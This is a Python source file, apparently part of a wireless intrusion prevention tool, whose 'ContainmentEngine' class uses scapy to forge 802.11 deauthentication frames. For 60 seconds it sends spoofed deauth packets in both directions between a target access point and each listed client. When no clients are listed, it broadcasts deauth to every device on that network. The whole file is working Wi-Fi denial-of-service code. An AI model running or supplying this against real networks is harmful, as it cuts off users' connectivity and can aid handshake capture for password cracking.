import time

import config
from config import DEAUTH_COUNT, DEAUTH_INTERVAL
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from runtime_state import client_kicked, log_attack, update_status


class ContainmentEngine:
    def __init__(self, iface=None):
        self.iface = iface or config.get_interface()

    def contain(self, bssid, clients, channel):
        if channel is None:
            update_status(message="Containment skipped: unknown channel")
            return

        update_status(message=f"Containment locked on channel {channel}")
        config.LOCKED_CHANNEL = channel
        time.sleep(1)

        attack_duration = 60
        start_time = time.time()
        log_attack(f"Containment started -> {bssid}", bssid)

        while time.time() - start_time < attack_duration:
            if clients:
                for client in clients:
                    self.deauth_pair(bssid, client)
                    client_kicked()
                    log_attack(f"Client {client} kicked from {bssid}", bssid)
            else:
                self.deauth_pair(bssid, "ff:ff:ff:ff:ff:ff")
                log_attack(f"Broadcast deauth -> {bssid}", bssid)

        config.LOCKED_CHANNEL = None
        log_attack(f"Containment finished -> {bssid}", bssid)
        update_status(message="Containment finished")

    def deauth_pair(self, bssid, client):
        pkt1 = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        pkt2 = RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)

        sendp(pkt1, iface=self.iface, count=DEAUTH_COUNT, inter=DEAUTH_INTERVAL, verbose=False)
        sendp(pkt2, iface=self.iface, count=DEAUTH_COUNT, inter=DEAUTH_INTERVAL, verbose=False)
        log_attack(f"Deauth sent {bssid} -> {client}", bssid)
